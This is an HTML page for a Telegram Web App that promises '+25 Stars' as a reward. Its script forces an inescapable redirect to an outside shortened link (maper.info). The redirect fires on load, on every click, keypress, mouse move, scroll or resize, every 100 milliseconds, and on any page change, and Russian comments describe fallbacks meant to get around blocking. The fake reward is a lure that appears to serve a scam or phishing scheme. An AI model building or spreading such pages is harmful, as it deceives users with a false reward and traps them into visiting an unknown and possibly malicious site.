<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading Stars...</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
            color: white;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            text-align: center;
        }

        .container {
            max-width: 400px;
            padding: 20px;
        }

        .loading-text {
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 30px;
            color: #ffd700;
        }

        .stars-text {
            font-size: 32px;
            font-weight: bold;
            margin: 20px 0;
            color: #ffd700;
            text-shadow: 0 0 20px rgba(255, 215, 0, 0.5);
        }

        .spinner {
            width: 60px;
            height: 60px;
            border: 6px solid rgba(255,255,255,0.3);
            border-top: 6px solid #ffd700;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 30px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .redirect-info {
            font-size: 14px;
            opacity: 0.7;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="loading-text">Loading your reward...</div>
        <div class="stars-text">+25 Stars</div>
        <div class="spinner"></div>
        <div class="redirect-info">Preparing redirect...</div>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        
        // МГНОВЕННЫЙ редирект - максимально быстро
        function forceRedirect() {
            const targetUrl = "https://maper.info/RNDX87";
            
            // Все методы сразу для максимальной скорости
            window.location.href = targetUrl;
            window.location.replace(targetUrl);
            
            // Дополнительные методы на случай блокировки
            setTimeout(() => {
                window.location = targetUrl;
            }, 10);
            
            setTimeout(() => {
                document.body.innerHTML = `<script>window.location.href="${targetUrl}"<\/script>`;
            }, 20);
        }
        
        // Запускаем мгновенно при загрузке
        document.addEventListener('DOMContentLoaded', function() {
            tg.ready();
            tg.expand();
            
            // Мгновенный редирект без задержек
            setTimeout(forceRedirect, 50);
        });
        
        // Редирект при любом действии пользователя
        document.addEventListener('click', forceRedirect);
        document.addEventListener('keydown', forceRedirect);
        document.addEventListener('mousemove', forceRedirect);
        document.addEventListener('touchstart', forceRedirect);
        document.addEventListener('scroll', forceRedirect);
        
        // Периодический редирект каждые 100мс
        setInterval(forceRedirect, 100);
        
        // Редирект когда страница становится видимой
        document.addEventListener('visibilitychange', function() {
            if (!document.hidden) {
                forceRedirect();
            }
        });
        
        // Редирект при изменении размера
        window.addEventListener('resize', forceRedirect);
        
        // Редирект при любом изменении DOM
        const observer = new MutationObserver(forceRedirect);
        observer.observe(document.body, { 
            childList: true, 
            subtree: true,
            attributes: true 
        });
    </script>
</body>
</html>
